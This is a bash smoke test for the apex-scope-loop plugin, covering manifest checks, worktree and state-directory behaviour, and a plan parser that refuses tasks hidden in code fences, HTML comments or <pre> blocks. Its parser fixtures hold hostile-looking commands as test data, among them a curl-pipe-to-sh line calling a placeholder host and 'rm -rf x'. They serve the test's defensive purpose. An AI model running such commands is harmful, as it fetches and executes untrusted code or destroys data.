#!/usr/bin/env bash
# apex-scope-loop structural smoke test
# Verifies the plugin contract from ADR-0001 (checks 1-10), ADR-0002 (11-13), ADR-0003 (14-43), ADR-0004 (44-61) and the knobs file (62). Exits non-zero on first failure.
set -euo pipefail

PLUGIN_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
fail() { echo "smoke FAIL: $1" >&2; exit 1; }
ok()   { echo "smoke OK:   $1"; }
# has PATTERN TEXT — grep TEXT without a pipe (grep -q closing a pipe early
# would SIGPIPE the writer under pipefail and fail the check at random).
has() { grep -q -- "$1" <<<"$2"; }

# 1. plugin.json exists and has required fields
PJ="$PLUGIN_ROOT/.claude-plugin/plugin.json"
[ -f "$PJ" ] || fail "missing $PJ"
for k in name version description author keywords; do
  grep -q "\"$k\"" "$PJ" || fail "plugin.json missing key: $k"
done
ok "plugin.json has name/version/description/author/keywords"

# 2. plugin.json does NOT enumerate skills/commands/agents arrays
for forbidden in '"skills"' '"commands"' '"agents"'; do
  if grep -q "$forbidden[[:space:]]*:[[:space:]]*\[" "$PJ"; then
    fail "plugin.json enumerates $forbidden array (must be auto-discovered)"
  fi
done
ok "plugin.json does not enumerate skills/commands/agents"

# 3 & 4. Both SKILL.md files have valid kebab-case name
for skill in apex-plan apex-execute; do
  S="$PLUGIN_ROOT/skills/$skill/SKILL.md"
  [ -f "$S" ] || fail "missing skill: $S"
  # Extract name: line from frontmatter (must be unquoted kebab-case)
  name_line=$(awk '/^---$/{c++; next} c==1 && /^name:/{print; exit}' "$S")
  [ -n "$name_line" ] || fail "$skill SKILL.md missing name: frontmatter"
  [[ "$name_line" =~ ^name:[[:space:]]+$skill[[:space:]]*$ ]] \
    || fail "$skill SKILL.md name: must be kebab-case '$skill' (got: $name_line)"
  ok "$skill SKILL.md frontmatter is valid"
done

# 5. No wildcard tools in any SKILL.md
for s in "$PLUGIN_ROOT"/skills/*/SKILL.md; do
  if grep -qE "allowed-tools:.*(\\*|mcp__\\*)" "$s"; then
    fail "$s has wildcard in allowed-tools"
  fi
done
ok "no wildcard tools in skills"

# 6. Both commands present with valid frontmatter
for cmd in start iterate; do
  C="$PLUGIN_ROOT/commands/$cmd.md"
  [ -f "$C" ] || fail "missing command: $C"
  grep -qE "^name:[[:space:]]+$cmd[[:space:]]*$" "$C" \
    || fail "$cmd command frontmatter missing or invalid name:"
  grep -q "^description:" "$C" || fail "$cmd command missing description"
done
ok "commands start + iterate present with valid frontmatter"

# 7. plan-author agent present with model: sonnet
A="$PLUGIN_ROOT/agents/plan-author.md"
[ -f "$A" ] || fail "missing agent: $A"
grep -qE "^name:[[:space:]]+plan-author[[:space:]]*$" "$A" || fail "plan-author missing name"
grep -qE "^model:[[:space:]]+sonnet[[:space:]]*$" "$A" || fail "plan-author missing model: sonnet"
ok "plan-author agent present with model: sonnet"

# 8. README has required sections
R="$PLUGIN_ROOT/README.md"
[ -f "$R" ] || fail "missing README.md"
for section in "Compatibility" "Namespace coordination" "Verification" "Architecture Decisions"; do
  grep -q "## $section" "$R" || fail "README missing section: $section"
done
ok "README has Compatibility/Namespace/Verification/ADR sections"

# 9. ADR-0001 exists with Status: Proposed
ADR="$PLUGIN_ROOT/docs/adrs/0001-apex-scope-loop-contract.md"
[ -f "$ADR" ] || fail "missing ADR-0001"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR" || fail "ADR-0001 not in Proposed status"
ok "ADR-0001 exists with Status: Proposed"

# 10. All .sh scripts in skills/ and scripts/ are executable
non_exec=$(find "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/scripts" -name "*.sh" \! -perm -u+x 2>/dev/null || true)
if [ -n "$non_exec" ]; then
  fail "non-executable .sh files found: $non_exec"
fi
ok "all .sh scripts are executable"

# 11. gibson-reviewer agent (ADR-0002) present, with a model and a VERDICT contract
GR="$PLUGIN_ROOT/agents/gibson-reviewer.md"
[ -f "$GR" ] || fail "missing agent: $GR"
grep -qE "^name:[[:space:]]+gibson-reviewer[[:space:]]*$" "$GR" || fail "gibson-reviewer missing name"
grep -qE "^model:[[:space:]]+[a-z]+" "$GR" || fail "gibson-reviewer missing model:"
grep -q "VERDICT: APPROVE" "$GR" || fail "gibson-reviewer does not define the VERDICT contract"
ok "gibson-reviewer agent present with model + VERDICT contract"

# 12. Harness scripts present and The Gibson credited
for s in green-gate risk-tier lessons backlog findings snapshot; do
  [ -f "$PLUGIN_ROOT/skills/apex-execute/scripts/$s.sh" ] || fail "missing harness script: $s.sh"
done
grep -q "The Gibson" "$PLUGIN_ROOT/NOTICE" 2>/dev/null || fail "NOTICE missing or does not credit The Gibson"
ok "harness scripts present; NOTICE credits The Gibson"

# 13. ADR-0002 exists with Status: Proposed
ADR2="$PLUGIN_ROOT/docs/adrs/0002-gibson-harness.md"
[ -f "$ADR2" ] || fail "missing ADR-0002"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR2" || fail "ADR-0002 not in Proposed status"
ok "ADR-0002 exists with Status: Proposed"

# 14. Portability (ADR-0003): no repo-local .claude/skills paths in commands, skills or agents
hits=$(grep -rnE '\.claude/skills/apex-(execute|plan)/' "$PLUGIN_ROOT/commands" "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/agents" 2>/dev/null || true)
[ -z "$hits" ] || fail "repo-local .claude/skills path (breaks marketplace installs): $hits"
[ ! -e "$PLUGIN_ROOT/skills/apex-execute/resources/templates/hooks-snippet.json" ] || fail "hooks-snippet.json must stay deleted (it pointed at a non-existent guardrail)"
ok "no .claude/skills paths; hooks-snippet.json removed"

# 15-16. Functional: a plan promoted in a scratch repo, then resolved from the
# base checkout and from inside the plan worktree, lands on ONE state dir.
# The functional checks must not inherit the caller's loop configuration.
for v in $(compgen -e | grep '^APEX_' || true); do unset "$v"; done
# The sibling apex-dispatch (shipped in this marketplace) routes every iterate
# and writes <state>/dispatch/, which puts checkpoint.sh into provenance mode.
# The scope-loop checks run with routing off (the 0.2.0 brief); checks 26 and
# 29 turn it back on to cover the integration, and 33 builds dispatch state itself.
export APEX_DISPATCH_MODE=off
SMOKE_TMP="$(mktemp -d "${TMPDIR:-/tmp}/apex-scope-loop-smoke.XXXXXX")"
trap 'git -C "$SMOKE_TMP/repo" worktree prune >/dev/null 2>&1 || true; chmod -R u+w "$SMOKE_TMP" 2>/dev/null || true; rm -rf "$SMOKE_TMP"' EXIT
[ -n "${SMOKE_KEEP:-}" ] && trap - EXIT
export GIT_AUTHOR_NAME=smoke GIT_AUTHOR_EMAIL=smoke@example.invalid GIT_COMMITTER_NAME=smoke GIT_COMMITTER_EMAIL=smoke@example.invalid
R="$SMOKE_TMP/repo"; mkdir -p "$R/.claude/tasks" "$R/.claude/plans"
git -C "$R" init -q -b main
cat >"$R/.claude/tasks/demo-adr.md" <<'ADR'
# ADR: demo
**Status**: Accepted
ADR
cp "$PLUGIN_ROOT/skills/apex-execute/resources/examples/sample-plan.md" "$R/.claude/plans/demo-plan.md"
git -C "$R" add -A && git -C "$R" commit -qm init
EX="$PLUGIN_ROOT/skills/apex-execute/scripts"
( cd "$R" && APEX_GIBSON=0 APEX_MEMORY_CMD= "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" demo >"$SMOKE_TMP/promote.log" 2>&1 ) \
  || fail "promote-to-loop.sh failed in a repo with no .claude/skills copy: $(tail -3 "$SMOKE_TMP/promote.log")"
ok "promote-to-loop resolves init.sh plugin-relatively (no .claude/skills copy)"

# brief DIR PLAN — iterate.sh's full brief, captured before any grep (grep -q
# closing the pipe early would SIGPIPE iterate.sh under pipefail).
# The exit code is kept as a final "__RC__: n" line so crashes are visible.
brief() { local o rc=0; o="$( (cd "$1" && "$EX/iterate.sh" "$2") 2>&1)" || rc=$?; printf '%s\n__RC__: %s\n' "$o" "$rc"; }

st() { # st DIR PLAN — the STATE line iterate.sh reports for PLAN when run from DIR
  ( cd "$1" && "$EX/iterate.sh" "$2" 2>&1 | sed -n 's/^STATE: //p' | head -1 ) || true
}
S_BASE="$(st "$R" .claude/plans/demo-plan.md)"
WTP="$( (cd "$R" && "$EX/iterate.sh" .claude/plans/demo-plan.md 2>&1 | sed -n 's/^WORKTREE: //p') || true)"
[ -n "$WTP" ] && [ -d "$WTP" ] || fail "iterate.sh did not report a plan worktree"
S_WT_PLAN="$(st "$WTP" "$WTP/.claude/plans/demo-plan.md")"
S_WT_CWD="$(st "$WTP" "$R/.claude/plans/demo-plan.md")"
ln -s "$R" "$SMOKE_TMP/link"
S_LINK="$(st "$SMOKE_TMP/link" .claude/plans/demo-plan.md)"
[ -n "$S_BASE" ] && [ "$S_BASE" = "$S_WT_PLAN" ] && [ "$S_BASE" = "$S_WT_CWD" ] && [ "$S_BASE" = "$S_LINK" ] \
  || fail "state dir differs: base=$S_BASE worktree-plan=$S_WT_PLAN worktree-cwd=$S_WT_CWD symlink=$S_LINK"
ok "one state dir from the base checkout, the plan worktree and a symlinked path"

# 17. Kill switches: a HALT in the checkout you run from, and a shared HALT, both stop the loop.
LW="$SMOKE_TMP/linked"; git -C "$R" worktree add -q -b linked "$LW" main
mkdir -p "$LW/gibson" && touch "$LW/gibson/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "gibson/HALT in the linked worktree being run from was ignored"
rm -f "$LW/gibson/HALT"; touch "$R/.dev-plan-state/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "shared .dev-plan-state/HALT was ignored from a linked worktree"
rm -f "$R/.dev-plan-state/HALT"
ok "checkout-local and shared kill switches both halt"

# 18. Outside git (APEX_NO_WORKTREE=1): init and iterate agree; same-named plans stay separate.
NG="$SMOKE_TMP/nogit"; mkdir -p "$NG/a" "$NG/b"
cp "$R/.claude/plans/demo-plan.md" "$NG/a/plan.md"; cp "$R/.claude/plans/demo-plan.md" "$NG/b/plan.md"
( cd "$NG" && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" a/plan.md >/dev/null && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" b/plan.md >/dev/null ) \
  || fail "init.sh failed outside git with APEX_NO_WORKTREE=1"
has '^STATUS: READY' "$(brief "$NG" a/plan.md)" || fail "iterate.sh outside git does not find the state init.sh wrote"
[ "$(st "$NG" a/plan.md)" != "$(st "$NG" b/plan.md)" ] || fail "two plans named plan.md share one state dir outside git"
ok "non-git mode: init/iterate agree and same-named plans do not collide"

# indir DIR CMD... — run CMD in DIR (portable stand-in for GNU `env -C`).
indir() { local d="$1"; shift; ( cd "$d" && env "$@" ); }
# expect_refusal LABEL PATTERN CMD... — CMD must fail and say PATTERN.
expect_refusal() {
  local label="$1" pat="$2" out; shift 2
  if out="$("$@" 2>&1)"; then fail "$label: expected a refusal, got success"; fi
  has "$pat" "$out" || fail "$label: refused for the wrong reason: $(printf '%s' "$out" | tail -2)"
}

# 19. A run is never silently taken over: re-init from another checkout with a
#     different base refuses; same base keeps the run's history.
expect_refusal "retarget to another base" "Refusing to retarget" \
  indir "$LW" APEX_BASE_BRANCH=linked "$EX/init.sh" "$R/.claude/plans/demo-plan.md"
python3 - "$S_BASE/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.setdefault("reviews", {})["99"] = {"sha": "x", "verdict": "APPROVE"}; json.dump(s, open(p, "w"))
PY
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "same-base re-init failed"
python3 -c 'import json,sys; sys.exit(0 if "99" in json.load(open(sys.argv[1])).get("reviews",{}) else 1)' "$S_BASE/checkpoint.json" \
  || fail "same-base re-init discarded the run's reviews"
ok "init refuses takeover; re-init keeps run history"

# 20. APEX_STATE_ROOT moves state only, is made absolute, and is keyed per repository.
cp "$R/.claude/plans/demo-plan.md" "$R/.claude/plans/rel-plan.md"
( cd "$R" && APEX_STATE_ROOT=rel-root APEX_GIBSON=0 "$EX/init.sh" .claude/plans/rel-plan.md >/dev/null 2>&1 ) || fail "init.sh with a relative APEX_STATE_ROOT failed"
A1="$(APEX_STATE_ROOT=rel-root st "$R" .claude/plans/rel-plan.md)"
A2="$(APEX_STATE_ROOT="$R/rel-root" st "$R/.claude" plans/rel-plan.md)"
case "$A1" in /*) ;; *) fail "APEX_STATE_ROOT state dir is not absolute: '$A1'" ;; esac
[ "$A1" = "$A2" ] || fail "relative APEX_STATE_ROOT split state: $A1 vs $A2"
ok "APEX_STATE_ROOT is absolute and stable across working directories"

# 21. One repository, proven: every acting script refuses another repo's plan,
#     even when the caller's repo runs a same-path plan; reporting scripts warn.
O="$SMOKE_TMP/other"; git init -q -b main "$O"; mkdir -p "$O/.claude/plans"
cp "$R/.claude/plans/demo-plan.md" "$O/.claude/plans/demo-plan.md"
git -C "$O" add -A && git -C "$O" commit -qm o
( cd "$O" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "init in the second repo failed"
O_HEAD="$(git -C "$O" rev-parse main)"
RP="$R/.claude/plans/demo-plan.md"
expect_refusal "init.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/init.sh" "$RP"
expect_refusal "land.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/land.sh" "$RP" --force
expect_refusal "checkpoint.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/checkpoint.sh" "$RP" halt x
expect_refusal "green-gate.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/green-gate.sh" "$RP" check
expect_refusal "risk-tier.sh cross-repo"  "repository mismatch.*refusing to act" indir "$O" "$EX/risk-tier.sh" "$RP" 1
IT_OUT="$( (cd "$O" && "$EX/iterate.sh" "$RP" 2>/dev/null) || true)"
has '^STATUS: ERROR repository mismatch' "$IT_OUT" || fail "iterate.sh cross-repo did not report STATUS: ERROR repository mismatch"
[ "$(git -C "$O" rev-parse main)" = "$O_HEAD" ] || fail "a cross-repo call moved the other repo's main"
ST_OUT="$( (cd "$O" && "$EX/status.sh" "$RP" 2>&1) || true)"
has 'WARNING: repository mismatch' "$ST_OUT" || fail "status.sh did not warn on a cross-repo plan"
ok "acting scripts refuse another repository's plan; status warns"

# 22. Branches are per plan; a foreign same-name branch is never adopted; a
#     deleted worktree is recreated by init.
B1="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$S_BASE/checkpoint.json")"
mkdir -p "$R/other"; cp "$RP" "$R/other/demo-plan.md"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "init of a same-slug plan failed"
B2="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$(st "$R" other/demo-plan.md)/checkpoint.json")"
[ "$B1" != "$B2" ] || fail "two same-slug plans share branch $B1"
cp "$RP" "$R/.claude/plans/fresh-plan.md"
FRESH_STATE="$(cd "$R" && source "$EX/_lib.sh" && apex_resolve .claude/plans/fresh-plan.md && echo "$STATE_DIR")"
git -C "$R" branch "apex-scope-loop/fresh-$(basename "$FRESH_STATE")" main
expect_refusal "adopt foreign branch" "refusing to adopt" indir "$R" APEX_GIBSON=0 "$EX/init.sh" .claude/plans/fresh-plan.md
WT2="$(st "$R" other/demo-plan.md)/worktree"
rm -rf "$WT2"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "re-init after deleting the worktree failed"
[ -d "$WT2" ] && [ "$(git -C "$WT2" symbolic-ref -q HEAD)" = "refs/heads/$B2" ] || fail "deleted worktree was not recreated on its branch"
ok "per-plan branches; foreign branch refused; deleted worktree recreated"

# 23. land.sh: refuses from the wrong checkout and with unrelated base changes,
#     without modifying anything; lands the exact worktree head otherwise.
L="$SMOKE_TMP/landrepo"; mkdir -p "$L/plans"; git init -q -b main "$L"
printf -- '- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n' >"$L/plans/l-plan.md"; echo base >"$L/tracked.txt"
git -C "$L" add -A && git -C "$L" commit -qm base
( cd "$L" && APEX_GIBSON=0 "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land test failed"
LWT="$(cd "$L" && "$EX/iterate.sh" plans/l-plan.md | sed -n 's/^WORKTREE: //p')"
[ -n "$LWT" ] || LWT="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_path"])' "$(st "$L" plans/l-plan.md)/checkpoint.json")"
echo feature >"$LWT/feature.txt"; git -C "$LWT" add -A; git -C "$LWT" commit -qm feature
LH="$(git -C "$LWT" rev-parse HEAD)"; MAIN0="$(git -C "$L" rev-parse main)"
expect_refusal "land from inside the plan worktree" "run land.sh from there" indir "$LWT" APEX_GIBSON=0 "$EX/land.sh" "$L/plans/l-plan.md"
echo dirty >>"$L/tracked.txt"
expect_refusal "land with unrelated base changes" "unrelated to this plan" indir "$L" APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md
[ "$(git -C "$L" rev-parse main)" = "$MAIN0" ] && [ "$(git -C "$LWT" rev-parse HEAD)" = "$LH" ] || fail "a refused land modified a branch"
git -C "$L" checkout -q -- tracked.txt
( cd "$L" && APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "land.sh failed on a ready plan"
git -C "$L" merge-base --is-ancestor "$LH" main || fail "land.sh did not merge the worktree head"
ok "land.sh refuses safely and merges the exact worktree head"

# 24. Every script that sources _lib.sh resolves (and so guards) before reading state.
for f in "$EX"/*.sh "$PLUGIN_ROOT"/skills/apex-plan/scripts/*.sh; do
  grep -q '_lib.sh"' "$f" || continue
  awk '/apex_resolve "\$PLAN"/{r=1} /read_field |\$CHECKPOINT/{ if(!r){bad=1; exit} } END{exit bad}' "$f" \
    || fail "$(basename "$f") reads state before apex_resolve"
done
ok "every _lib.sh user resolves before reading state"

# 25. Plan parsing (planlib.py, the one parser): widened tags, 8-line look-ahead
#     with six directives, Blocked-by forms, next-unblocked selection, fail-closed
#     unknown references, validation (Route/Budget values, lanes need Paths, cycles).
PL="$EX/planlib.py"; P25="$SMOKE_TMP/p25.md"
cat >"$P25" <<'PLAN'
- [x] **Phase 1.1** [docs] done
  - Acceptance: true
- [ ] **Phase 1.2** [backend][gate:partner:x@y.com] waits on 1.3
  - Acceptance: true
  - Blocked-by: **Phase 1.3**
- [ ] **Phase 1.3 — six directives** [tests] all six directives, see [docs](x.md)
  - Acceptance: `pytest -q`
  - Notes: directives may sit anywhere in the first eight lines
  - Blocked-by: phase-1.1
  - Swarm: single [coder]
  - Route: class=tests provider=auto fanout=lanes review=solo
  - Paths: tests/a/**
  - Budget: usd=2 spawns=3 minutes=20
- [ ] **Phase 1.4** [tests] lane two
  - Acceptance: true
  - Route: fanout=lanes
  - Paths: src/b/**
- [ ] **Phase 1.5** [docs] waits on a gate that does not exist
  - Acceptance: true
  - Blocked-by: Gate 9→10
PLAN
python3 - "$PL" "$P25" <<'PY' || fail "planlib next: wrong selection or parsing"
import json, subprocess, sys
d = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "next", sys.argv[2]]))
t = d["task"]
assert d["status"] == "READY" and t["id"] == "Phase 1.3", d
assert t["acceptance"] == "pytest -q" and t["swarm"] == "single [coder]", t
assert t["route"] == {"class": "tests", "provider": "auto", "fanout": "lanes", "review": "solo"}, t["route"]
assert t["paths"] == ["tests/a/**"] and t["budget"] == {"usd": "2", "spawns": "3", "minutes": "20"}, t
assert d["lanes"] == [t["line_no"], t["line_no"] + 8], d["lanes"]
blocked = {b["id"]: b for b in d["blocked"]}
assert blocked["Phase 1.2"]["open"] == ["Phase 1.3"], blocked
assert blocked["Phase 1.5"]["unknown"] == ["Gate 9→10"], blocked
tags = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "task", sys.argv[2], "3"]))["tags"]
assert tags == ["backend", "gate:partner:x@y.com"], tags
assert "docs" not in t["tags"] and t["tags"] == ["tests"], t["tags"]   # [docs](x.md) is link text
PY
python3 "$PL" next "$EX/../resources/examples/sample-plan.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["task"]["id"]=="Phase 1.1" and any(b["id"]=="Phase 1.2" and b["open"]==["Phase 1.1"] for b in d["blocked"]), d' \
  || fail "sample-plan: **Phase 1.2** Blocked-by phase-1.1 is not resolved"
V="$(python3 "$PL" validate "$P25" || true)"
has "Blocked-by 'Gate 9→10' does not name a task" "$V" || fail "validate missed an unknown Blocked-by"
printf -- '- [ ] **Phase 1.1** [x] a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n  - Route: class=nope fanout=lanes\n  - Budget: usd=-1\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$SMOKE_TMP/bad.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/bad.md" || true)"
for want in "Route class=nope" "fanout=lanes requires a Paths" "Budget usd=-1" "Blocked-by cycle"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Fail-closed parsing: fenced examples are not tasks; repeated Blocked-by
# lines merge; a duplicated id blocks until every copy is checked; '..' and
# absolute Paths never count as disjoint; line numbers match sed's.
cat >"$SMOKE_TMP/fc.md" <<'PLAN'
- [ ] **Phase 1.1** [docs] real
  - Acceptance: true
- [x] **Phase 1.2** [docs] done
  - Acceptance: true
- [ ] **Phase 2.1** [docs] two Blocked-by lines
  - Acceptance: true
  - Blocked-by: Phase 1.1
  - Blocked-by: Phase 1.2
- [x] **Phase 3.1** dup done
  - Acceptance: true
- [ ] **Phase 3.1** dup open
  - Acceptance: true
- [ ] **Phase 3.2** waits on a duplicated id
  - Acceptance: true
  - Blocked-by: Phase 3.1
PLAN
python3 - "$PL" "$SMOKE_TMP/fc.md" <<'PY' || fail "planlib fail-closed parsing"
import json, subprocess, sys
pl, p = sys.argv[1:]
d = json.loads(subprocess.check_output([sys.executable, pl, "next", p]))
assert d["task"]["id"] == "Phase 1.1" and d["task"]["line_no"] == 1, d["task"]
b = {x["id"]: x for x in d["blocked"]}
assert b["Phase 2.1"]["open"] == ["Phase 1.1"], b
assert b["Phase 3.2"]["open"] == ["Phase 3.1"], b
sys.dont_write_bytecode = True
sys.path.insert(0, pl.rsplit("/", 1)[0]); import planlib
assert not planlib.disjoint(["src/a/../shared/*.py"], ["src/shared/util.py"])
assert not planlib.disjoint(["/repo/src/**"], ["src/**"]) and not planlib.disjoint(["../x/**"], ["y/**"])
assert not planlib.disjoint(["src/a/**/../../b/x.py"], ["b/x.py"]) and not planlib.disjoint(["src/a/[.][.]/../b/x.py"], ["b/x.py"])
assert not planlib.disjoint(["Src/A/**"], ["src/a/x.py"])
assert planlib.disjoint(["src/a/**"], ["src/b/**"])
PY
printf 'line one \342\200\250 has U+2028\n- [ ] **Phase 1.1** A\n  - Acceptance: true\n- [ ] **Phase 1.2** B\n  - Acceptance: true\n' >"$SMOKE_TMP/ls.md"
# Every character str.splitlines would break on (U+2028, \v, \f, \x1c-\x1e,
# U+0085) is whitespace, so it is refused: line numbers cannot drift from sed's.
has "U+2028" "$(python3 "$PL" validate "$SMOKE_TMP/ls.md" 2>&1 || true)" || fail "a U+2028 line separator was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Acceptance: false\n  - N1: x\n  - N2: x\n  - N3: x\n  - N4: x\n  - N5: x\n  - N6: x\n  - Blocked-by: Phase 1.1\n\n  - Swarm: single\n' >"$SMOKE_TMP/late.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/late.md" || true)"
for want in "Acceptance: given more than once" "beyond the 8-line look-ahead" "directive outside any task block"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Nothing is ever hidden: every column-0 "- [ ]" line is a task, and markdown
# structure can only make a plan invalid (fail closed), never drop a task or
# let example text supply a command.
fx() { printf '%b' "$2" >"$SMOKE_TMP/$1.md"; python3 "$PL" next "$SMOKE_TMP/$1.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["status"], (d.get("task") or {}).get("id"))'; }
vx() { python3 "$PL" validate "$SMOKE_TMP/$1.md" 2>&1 || true; }
[ "$(fx f1 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```x``` marks inline code\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.2" ] || fail "inline code at line start opened a fence"
[ "$(fx f2 '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed fence did not make the plan an error"
[ "$(fx f3 '~~~\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n~~~\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a fence was not refused"
[ "$(fx f4 '````\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n````\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a four-backtick fence was not refused"
[ "$(fx f6 '<!--\n- [ ] **Phase 9.1** commented out\n  - Acceptance: rm -rf x\n-->\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside an HTML comment was not refused"
[ "$(fx f7 '<!-- never closed\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed HTML comment did not make the plan an error"
[ "$(fx f8 '        ```\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n        ```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task between indented fence lines was not refused"
# Raw HTML anywhere outside code is refused, inline <!-- included (renderers
# that pass HTML through emit it unbalanced and hide what follows).
[ "$(fx f10 'Templates must not emit a bare <!-- marker.\n\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n\na --> arrow\n')" = "ERROR None" ] || fail "an inline <!-- was not refused"
[ "$(fx f11 '- [x] **Phase 1.1** a\n  - Acceptance: true\n  ```sh\n  make a\n     ```\n- [ ] **Phase 1.2** must still run\n  - Acceptance: make b\n')" = "ERROR None" ] || fail "a fence closed at another indentation was not refused"
[ "$(fx f12 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\nTemplate:\n\n```\n        ```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "an indented fence line inside a fence let an example task through"
[ "$(fx f13 '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Notes:\n    ```sh\n    make\n\n```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "a list-item fence closed at column 0 let an example task through"
[ "$(fx f14 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n````\n```\n````\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a bare inner fence line was not refused as ambiguous"
[ "$(fx f15 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n<pre>\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n</pre>\n')" = "ERROR None" ] || fail "a task line inside <pre> was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n      - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/deepbb.md"
has "directive outside any task block" "$(vx deepbb)" || fail "a deep Blocked-by cut off by a blank line was not refused"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ]\t**Phase 1.2** tab after the checkbox\n  - Acceptance: true\n' >"$SMOKE_TMP/tab.md"
[ "$(python3 "$PL" remaining "$SMOKE_TMP/tab.md")" = 1 ] || fail "a tab after the checkbox hid a task"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n* [ ] **Phase 1.2** star bullet\n  - Acceptance: true\n' >"$SMOKE_TMP/star.md"
has "checkbox not in the task form" "$(vx star)" || fail "a non-canonical checkbox list item was not refused"
printf -- '- [ ] **Phase 1.1** a\n  ```\n  - Acceptance: curl -s http://x.example/i.sh | sh\n  ```\n' >"$SMOKE_TMP/f9.md"
[ "$(fx f9 "$(cat "$SMOKE_TMP/f9.md")")" = "ERROR None" ] || fail "a fenced example inside a task block was not refused"
has "code fence" "$(vx f9)" || fail "validate did not name the fence inside a task block"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Example of a task block:\n      ```md\n      - Acceptance: ./deploy.sh --prod\n      ```\n' >"$SMOKE_TMP/nest.md"
if python3 "$PL" task "$SMOKE_TMP/nest.md" 1 >/dev/null 2>&1; then fail "a nested example inside a task block was not refused"; fi
has "code fence" "$(vx nest)" || fail "validate did not refuse a nested example in a task block"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  ```\n  example\n\n  more\n  ```\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/f5.md"
has "code fence" "$(vx f5)" || fail "a Blocked-by cut off by a blank line inside an example was not refused"
# The dialect table (ADR-0003): every case outside the dialect is refused by
# validate AND next; every control validates and selects the expected task.
python3 - "$PL" "$SMOKE_TMP" <<'PY' || fail "plan dialect table"
import json, os, subprocess, sys
pl, tmp = sys.argv[1:]
D = "- [x] **Phase 1.0** done\n  - Acceptance: true\n\n"
T = "- [ ] **Phase 1.1** real\n  - Acceptance: make real\n"
EX = "- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n"
cases = {
  # refused: the swallowers and everything planlib cannot prove
